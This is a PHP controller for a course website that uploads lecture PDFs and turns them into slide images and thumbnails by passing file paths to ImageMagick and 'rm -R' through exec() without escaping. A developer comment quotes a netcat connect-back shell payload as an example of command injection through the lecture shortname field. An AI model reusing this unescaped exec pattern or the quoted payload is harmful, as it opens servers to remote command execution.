<?php

define('IMAGEMAGICK_EXEC', 'convert');

define('LECTURE_IMAGES_DIR', 'images');
define('LECTURE_THUMBS_DIR', 'thumbs');

define('SLIDE_IMAGE_HEIGHT', 600);
define('SLIDE_THUMBNAIL_IMAGE_HEIGHT', 130);

define('RANDOM_STRING_LENGTH', 30);

define('MAX_SLIDE_UPLOAD_SIZE', 50000);   // 50MB

define('SLIDE_IMAGE_QUALITY', 85);
define('THUMBNAIL_IMAGE_QUALITY', 95);

function generate_random_string()
{
    return substr(md5(uniqid(rand(), true)), 0, RANDOM_STRING_LENGTH);
}

class Lecture extends MY_Controller {

    function __construct()
    {
        parent::__construct();
        $this->load->model('lectures_model');
        $this->load->model('slides_model');
        $this->load->model('comments_model');
        $this->load->library('form_validation');
        $this->load->helper(array('form', 'url', 'course_url'));

        // TODO(awreece) Does php have a method for constructing directory paths?
        $this->lectures_base_dir = $this->config->item('content_base_path') . '/' .
                   $this->config->item('lectures_rel_path');
        $this->lectures_base_url = $this->config->item('content_base_url')  . '/' .
                                   $this->config->item('lectures_rel_path');
    }

    // Main function returns a list of lectures.
    function index() {
        $this->require_login();
        $this->require_privileged();

        $data['lectures'] = $this->lectures_model->get_all();
        $this->load_view('Lectures', 'lecture_list', $data);
    }

    // This is a view of an individual slide.
    function view_slide($shortname, $slide_name) {
        $lecture = $this->lectures_model->get_lecture_by_shortname($shortname);

        if (is_null($lecture)) {
            show_404();
            // TODO(awreece) Figure out why this continues.
        }
        $db_slide = $this->slides_model->get_slide_by_lecture_and_name($lecture, $slide_name);
        if (!$db_slide) {
            show_404();
        }

	    $slide_aspect_ratio = $this->get_aspect_ratio($lecture->aspect_ratio);

        // TODO(awreece) Oh, this is gonna be awksauce.
        list($slide_number) = sscanf($db_slide->name, SLIDE_NAME_FORMAT_STRING);

        $slide = new stdClass;
        $slide->slide_number = $slide_number;
        $slide->image_url =
            $this->get_lecture_base_url($lecture->number, $lecture->shortname) . '/' .
            $this->get_lecture_image_rel_path($db_slide->name, LECTURE_IMAGES_DIR);
        $data['slide'] = $slide;
        $data['lecture'] = $lecture;
        $data['lecture_summary_url'] = lecture_url($shortname);
        $data['lecture_writeup_url'] = lecture_writeup_url($shortname);
        $data['slide_image_width'] = SLIDE_IMAGE_HEIGHT * $slide_aspect_ratio;
        $data['slide_image_height'] = SLIDE_IMAGE_HEIGHT;

        if ($db_slide->previous_name) {
            $data['prev_slide_url'] = slide_url($shortname, $db_slide->previous_name);
        }
        if ($db_slide->next_name) {
            $data['next_slide_url'] = slide_url($shortname, $db_slide->next_name);
        } else {
            $data['next_slide_url'] = lecture_url($shortname);
        }

        if ($lecture->comments_enabled)
            $data['comments_html'] = $this->comments_html('LECTURE', $lecture, $slide_name);

        $this->load_view('Slide View', 'lecture_slide', $data);
    }

    function view_summary($shortname) {
        $lecture = $this->lectures_model->get_lecture_by_shortname($shortname);

        if (!$lecture) {
            show_404();
        }

        $slides_array = array();
        $lecture_image_basedir =
        $this->get_lecture_base_path($lecture->number, $lecture->shortname) . '/'
        . LECTURE_IMAGES_DIR;
        $slides = $this->slides_model->get_slides_by_lecture($lecture);

        foreach($slides as $slide) {
            list($slide_number) = sscanf($slide->name, SLIDE_NAME_FORMAT_STRING);

            $thumbnail_image_url =
                $this->get_lecture_base_url($lecture->number, $lecture->shortname) . '/' .
                $this->get_lecture_image_rel_path($slide->name, LECTURE_THUMBS_DIR);


            $num_slide_comments = 0;
            if ($lecture->comments_enabled) {
                $comments_query = array('parent_type' => 'LECTURE',
                                        'parent_id' => $lecture->id,
                                        'parent_item' => $slide->name);
                $num_slide_comments =  $this->comments_model->count_comments_matching($comments_query);
            }
                                    
            array_push($slides_array, array(
                'image_url' => $thumbnail_image_url,
                'link_url' => slide_url($lecture->shortname, $slide->name),
                'num_comments' => $num_slide_comments 
            ));
        }

        $slide_aspect_ratio = $this->get_aspect_ratio($lecture->aspect_ratio);

        $data['lecture'] = $lecture;
        $data['slides'] = $slides_array;
        $data['lecture_writeup_url'] = lecture_writeup_url($lecture->shortname);
        $data['lecture_pdf_url'] =
            $this->get_lecture_base_url($lecture->number, $lecture->shortname) . '/' .
            $this->get_lecture_pdf_rel_path($lecture->number, $lecture->shortname);

        //$data['comments_html'] = $this->comments_html('LECTURE', $lecture);
        $data['slide_thumbnail_height'] = SLIDE_THUMBNAIL_IMAGE_HEIGHT;
        $data['slide_thumbnail_width'] = intval($slide_aspect_ratio * SLIDE_THUMBNAIL_IMAGE_HEIGHT);
        $data['slide_thumbnail_horiz_spacing'] = $data['slide_thumbnail_width'] + 7;
        $this->load_view('Lecture Summary', 'lecture_summary', $data);
    }

    function edit($shortname)
    {
        if (!$this->is_current_session_privileged()) {
            show_error("Please login as an instructor to access this page.", 403);
            return;
        }

    	$lecture = $this->lectures_model->get_lecture_by_shortname($shortname);

        if (is_null($lecture)) {
            show_404();
        }

        $data['lecture'] = $lecture;

        $this->load_view('Lecture Edit', 'lecture_edit', $data);
    }

    function do_editmeta($shortname)
    {
        if (!$this->is_current_session_privileged()) {
            show_error("Please login as an instructor to access this page.", 403);
            return;
        }

    	$lecture = $this->lectures_model->get_lecture_by_shortname($shortname);

        if (is_null($lecture)) {
            show_404();
        }

	    // set up form validation    
        $this->form_validation->set_rules('title', 'title',
            'required|trim|max_length[128]|xss_clean');
        $this->form_validation->set_rules('video_url', 'video_url',
            'trim|max_length[256]|xss_clean');

        if (!$this->form_validation->run()) {
            $error = validation_errors();
            $this->load_view("Lecture Edit", "lecture_edit",
                array('error' => $error,
                      'lecture' => $lecture));
            return;
        }

	    // now update the db

        $updated_lecture = array();
        $updated_lecture['title'] = $this->input->post('title');
        $updated_lecture['video_url'] = $this->input->post('video_url');

        $updated_lecture['comments_enabled'] = false;
        if ($this->input->post('comments_enabled') === 'allowcomments') {
            $updated_lecture['comments_enabled'] = true;
        }

        $updated_lecture['instructor_notes_enabled'] = false;
        if ($this->input->post('instructor_notes_enabled') === 'shownotes') {
            $updated_lecture['instructor_notes_enabled'] = true;
        }
        
        // Update user data
        $this->lectures_model->edit_lecture($lecture->shortname, $updated_lecture);

        $data['lectures'] = $this->lectures_model->get_all();
        $this->load_view('Lectures', 'lecture_list', $data);
    }

    function do_editslides($shortname)
    {
        if (!$this->is_current_session_privileged()) {
            show_error("Please login as an instructor to access this page.", 403);
            return;
        }

    	$lecture = $this->lectures_model->get_lecture_by_shortname($shortname);

        if (is_null($lecture)) {
            show_404();
        }

        $config['upload_path'] = realpath($this->config->item('content_base_path') . '/' .
                      $this->config->item('uploads_rel_path'));
        $config['allowed_types'] = 'pdf';
        $config['max_size']= MAX_SLIDE_UPLOAD_SIZE;
        $config['remove_spaces'] = TRUE;
        $config['file_name'] = 'slides_' . md5(microtime()) . '.pdf';

        $this->load->library('upload', $config);

	if (!$this->upload->do_upload())
        {
            $error = array('error' => $this->upload->display_errors());
            $data['lecture'] = $lecture;		
	    $data['error'] = $error;	
            $this->load_view('Lecture Edit', 'lecture_edit', $data);
	    return;
        }

	$data = array('upload_data' => $this->upload->data());
        $uploaded = $data['upload_data'];
        log_message('debug', 'Just uploaded slides to: ' . $uploaded['full_path']);

   	// 1. create a temp directory for the output images + thumbnails

	$lecture_dir = $this->get_lecture_base_path($lecture->number, $lecture->shortname);
  	$lecture_image_dir = $lecture_dir . '/' . LECTURE_IMAGES_DIR;
        $lecture_thumb_dir = $lecture_dir . '/' . LECTURE_THUMBS_DIR;

	$tmp_shortname = generate_random_string();
	$tmp_dir = $this->get_lecture_base_path(0, $tmp_shortname);
	$tmp_image_dir = $tmp_dir . '/' . LECTURE_IMAGES_DIR;

	mkdir($tmp_dir);
        mkdir($tmp_image_dir);

        // 2. verify there are the same number of slides as before.

        // Convert the uploaded pdf file into a bunch of image files for slides.
        $output_filename = $tmp_image_dir . '/' . SLIDE_NAME_FORMAT_STRING . '.jpg';

	// NOTE(kayvonf): 12/28/15 multiplication by two on the slide
	// height is so that the image is big enough for modern retina
	// displays. (the slides were starting to look a little
	// fuzzy.)

	$cmd = $this->get_image_resize_cmd_string($uploaded['full_path'], $output_filename, 2 * SLIDE_IMAGE_HEIGHT, SLIDE_IMAGE_QUALITY);
        log_message('debug', 'Executing: ' . $cmd);
        $cmd_result = array();
        exec($cmd, $cmd_result);

        // log the result of the imagemagick command in case of error
        $result_str = "\n";
        foreach ($cmd_result as $output_line) {
           $result_str = $result_str . $output_line . "\n";
        }
        log_message('debug', "Imagemagick convert result was:\n" . $result_str);

        // generate slide thumbnails

        $slide_images = scandir($tmp_image_dir);
        $slide_count = count($slide_images) - 2;   // -2 because of '.' and '..'
        $slides = array();

        log_message('debug', 'Files in ' . $tmp_image_dir . ': ' . $slide_count . ', expecting ' . $lecture->num_slides);
	
	if ($slide_count != $lecture->num_slides) {
           log_message('debug', 'Failured to update lecture. Incorrect number of slides in uploaded pdf.');

	   // cleanup:
           exec('rm -R ' . $tmp_dir);	

           $data['lecture'] = $lecture;		
	   $data['error'] = 'Uploaded pdf must have the same number of slides as the existing lecture.';	
           $this->load_view('Lecture Edit', 'lecture_edit', $data);
	   return;
        }

	// make some thumbnails, and copy the input image into its final position
        foreach($slide_images as $slide_image_filename) {

 	    $path_parts = pathinfo($slide_image_filename);

            if ($path_parts['extension'] != 'jpg')
               continue;

                $input_image = $tmp_image_dir . '/' . $path_parts['basename'];
                $thumb_image = $lecture_thumb_dir . '/' . $path_parts['basename'];
                log_message('debug', 'Executing: ' . $cmd);

		// NOTE(kayvonf): multiplication by 2 for retina display
                $cmd = $this->get_image_resize_cmd_string($input_image, $thumb_image, 2 * SLIDE_THUMBNAIL_IMAGE_HEIGHT, THUMBNAIL_IMAGE_QUALITY);
                exec($cmd);

		rename($input_image, $lecture_image_dir . '/' . $path_parts['basename']);
            }

            // Place the pdf in a more permanent location.
            rename($uploaded['full_path'],
                   $lecture_dir . '/' . $this->get_lecture_pdf_rel_path($lecture->number, $lecture->shortname));
	
        // 4. delete any left over temp stuff	
	// cleanup:
 	exec('rm -R ' . $tmp_dir);

        $data['lectures'] = $this->lectures_model->get_all();
        $this->load_view('Lectures', 'lecture_list', $data);
    }

    // Show the create new lecture page
    function create()
    {
        if (!$this->is_current_session_privileged()) {
            show_error("Please login as an instructor to access this page.", 403);
            return;
        }

        $this->load_view('Lecture Create', 'lecture_create', array());
    }

    function do_create()
    {
        // TODO(awreece) Require post.
        // TODO(awreece) This function is too long.

        if (!$this->is_current_session_privileged()) {
            show_error("Please login as an instructor to access this page.", 403);
            return;
        }

        $config['upload_path'] = realpath($this->config->item('content_base_path') . '/' .
                      $this->config->item('uploads_rel_path'));
        $config['allowed_types'] = 'pdf';
        $config['max_size']=  MAX_SLIDE_UPLOAD_SIZE;
        $config['remove_spaces'] = TRUE;
        $config['file_name'] = 'slides_' . md5(microtime()) . '.pdf';

        $this->load->library('upload', $config);
        $this->load->library('form_validation');

        $this->form_validation->set_rules('shortname', 'shortname',
                      'required|max_length[32]|alpha_dash|strtolower');
        $this->form_validation->set_rules('lecture_date', 'lecture date', 'date_validate');
        $this->form_validation->set_rules('title', 'lecture title',
                                          'required|trim|max_length[128]');
        $this->form_validation->set_rules('aspect_ratio', 'aspect_ratio',
                      'required|max_length[32]|alpha_dash|strtolower');
  					  
        $this->form_validation->set_rules('number', 'lecture number', 'required|integer');

        if ($this->form_validation->run() == FALSE)
        {
            $error = array('error' => 'Validation failed');
            $this->load_view('Lecture Create', 'lecture_create', $error);
	    return;
        }

        else if ( !$this->upload->do_upload())
        {
            $error = array('error' => $this->upload->display_errors());
            $this->load_view('Lecture Create', 'lecture_create', $error);
	    return;
        }

        else
        {
            $lecture_number = intval($this->input->post('number'));
            $lecture_shortname = $this->input->post('shortname');
	    $lecture_aspect_ratio = $this->input->post('aspect_ratio');

            $data = array('upload_data' => $this->upload->data());

            $uploaded = $data['upload_data'];
            log_message('debug', 'Just uploaded slides to: ' . $uploaded['full_path']);

            if (!realpath($this->lectures_base_dir)) {
                log_message('error', 'Path to lectures base directory appears to be invalid');
                $error = array('error' => 'Missing lectures base directory');
                $this->load_view('Lecture Create', 'lecture_create', $error);
		return;
            }

            // XXX(awreece): should really scrub the shortname, a shortname of
            // "; nc ip 6666 | bash | nc ip 6667#" should be a connect back shell.
            // NOTE(kayvonf): Isn't shortname scrubbed appropriately
            // by the form validator, which doesn't allow spaces?
            $lecture_dir = $this->get_lecture_base_path($lecture_number, $lecture_shortname);
            $lecture_image_dir = $lecture_dir . '/' . LECTURE_IMAGES_DIR;
            $lecture_thumb_dir = $lecture_dir . '/' . LECTURE_THUMBS_DIR;

            // Remove pre-existing lecture directory if it exists.  I use an exec
            // to just call 'rm -R', which is Linux platform specific, but avoids having
            // to explicitly delete all the folder's contents.
            if (file_exists($lecture_dir)) {
                exec('rm -R ' . $lecture_dir);
            }

            mkdir($lecture_dir);
            mkdir($lecture_image_dir);
            mkdir($lecture_thumb_dir);

            // Convert the uploaded pdf file into a bunch of png files for slides.
            $output_filename = $lecture_image_dir . '/' . SLIDE_NAME_FORMAT_STRING . '.jpg';

    	    // NOTE(kayvonf): 12/28/15 multiplication by two on the slide
            // height is so that the image is big enough for modern retina
	    // displays. (the slides were starting to look a little
	    // fuzzy.)
	    $cmd = $this->get_image_resize_cmd_string($uploaded['full_path'], $output_filename, 2 * SLIDE_IMAGE_HEIGHT, SLIDE_IMAGE_QUALITY);
            log_message('debug', 'Executing: ' . $cmd);
            $cmd_result = array();
            exec($cmd, $cmd_result);

            // log the result of the imagemagick command in case of error
            $result_str = '\n';
            foreach ($cmd_result as $output_line) {
                $result_str = $result_str . $output_line . '\n';
            }
            log_message('debug', 'Imagemagick convert result was:\n' . $result_str);

            // generate slide thumbnails
            $slide_count = 0;
            $slide_images = scandir($lecture_image_dir);
            $slides = array();

            // TODO(awreece) Do this as batch?
            foreach($slide_images as $slide_image_filename) {

                $path_parts = pathinfo($slide_image_filename);

                if ($path_parts['extension'] != 'jpg')
                    continue;

                $slide_count++;

                $input_image = $lecture_image_dir . '/' . $path_parts['basename'];
                $thumb_image = $lecture_thumb_dir . '/' . $path_parts['basename'];
                log_message('debug', 'Executing: ' . $cmd);

		// NOTE(kayvonf): multiplication by 2 for retina display
                $cmd = $this->get_image_resize_cmd_string($input_image, $thumb_image, 2 * SLIDE_THUMBNAIL_IMAGE_HEIGHT, THUMBNAIL_IMAGE_QUALITY);
                exec($cmd);
            }

            // Place the pdf in a more permanent location.
            rename($uploaded['full_path'],
                   $lecture_dir . '/' . $this->get_lecture_pdf_rel_path($lecture_number, $lecture_shortname));
            log_message('debug', 'Lecture has ' . $slide_count . ' slides.');

            // Add the lecture to the database.
            $lecture_date = $this->input->post('lecture_date');
            $result = $this->lectures_model->add_lecture(
                // TODO(awreece) Why is this capitalized? Learn more PHP.
                Array('shortname' => $lecture_shortname,
                      'number' => $lecture_number,
                      'title' => $this->input->post('title'),
                      'lecture_date' => date('Y-m-d', strtotime($lecture_date)),
                      'num_slides' => $slide_count,
		      'video_url' => '',
                      'aspect_ratio' => $lecture_aspect_ratio) );

            $lecture = $this->lectures_model->get_lecture_by_shortname($lecture_shortname);
            // TODO(awreece) What if this fails?
            $this->slides_model->add_slides_for_lecture($lecture, $slide_count);

            // Done: display a success message
            $this->load_view('Lecture Created', 'lecture_create_success', array('lecture' => $lecture) );
        }
    }

    function delete($shortname) {

        if (!$this->is_current_session_privileged()) {
            show_error("Please login as an instructor to access this page.", 403);
            return;
        }

        $lecture = $this->lectures_model->get_lecture_by_shortname($shortname);
        $lecture_dir = $this->get_lecture_base_path($lecture->number,
                                                    $lecture->shortname);
        if (file_exists($lecture_dir)) {
          exec('rm -R ' . $lecture_dir);
        }

        $this->slides_model->delete_slides_for_lecture($lecture);
        $this->lectures_model->delete_lecture($lecture);

        redirect(site_url('lectures'));
    }

    function date_validate($value) {
        if (strtotime($value) == FALSE) {
            $this->form_validation->set_message('date_validate', 'Could not parse lecture date.');
            return FALSE;
        } else {
            return TRUE;
        }
    }

    /*
     * Convenience methods for local path or URL construction.  For
     * now, these should be considered internals to the lectures
     * class since they are not used elsewhere.
     */

    // Will return an absolute server file system path to base directory of lecture.
    function get_lecture_base_path($lecture_number, $shortname) {
    $lecture_name = sprintf('%02d_%s', $lecture_number, $shortname);
        return $this->lectures_base_dir  . '/' . $lecture_name;
    }

    // Will return an absolute url to base directory of lecture.
    function get_lecture_base_url($lecture_number, $shortname) {
    $lecture_name = sprintf('%02d_%s', $lecture_number, $shortname);
        return $this->lectures_base_url . '/' . $lecture_name;
    }

    // Will return an image path that can be appended to either a base
    // filesystem path or a base URL.
    function get_lecture_image_rel_path($slide_name, $image_type) {
        return $image_type . '/' . $slide_name . ".jpg";
    }

    function get_image_resize_cmd_string($input_filename, $output_filename, $image_height, $image_quality) {

        // NOTE(kayvonf): the 'scene 1' argument starts counting at 1
	    // instead of 0 (its ignored if the output filename is not a pattern)

        // XXX(awreece) Check for command injection!
        $cmd = IMAGEMAGICK_EXEC . ' ' . $input_filename .
            ' -resize x' . $image_height . ' -quality ' . $image_quality . ' -scene 1 ' . $output_filename;
	return $cmd;
    }

    function get_lecture_pdf_rel_path($number, $shortname) {
        return sprintf('%02d_%s_slides.pdf', $number, $shortname);
    }

    function get_aspect_ratio($aspect_ratio) {
	if ($aspect_ratio == '16-9')
	  return 16 / 9;
        else if ($aspect_ratio == '85-11')
          return 8.5 / 11;
        else
          return 4 / 3;
    }

  }

?>
